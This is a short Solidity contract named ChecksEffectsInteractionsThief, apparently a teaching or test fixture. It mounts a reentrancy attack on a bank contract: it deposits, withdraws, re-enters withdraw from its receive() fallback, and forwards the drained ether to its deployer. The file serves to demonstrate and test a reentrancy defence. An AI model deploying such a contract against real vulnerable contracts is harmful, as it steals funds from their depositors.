//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.4;

import "hardhat/console.sol";

import "./ChecksEffectsInteractionsBank.sol";

contract ChecksEffectsInteractionsThief {
    address thief;
    ChecksEffectsInteractionsBank bank;

    constructor(address bankAddress) {
        thief = msg.sender;
        bank = ChecksEffectsInteractionsBank(bankAddress);
    }

    receive() external payable {
        if (address(bank).balance >= msg.value) {
            bank.withdraw();
        }
    }

    function steal() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();

        (bool success, ) = thief.call{value: address(this).balance}("");
        require(success);
    }
}
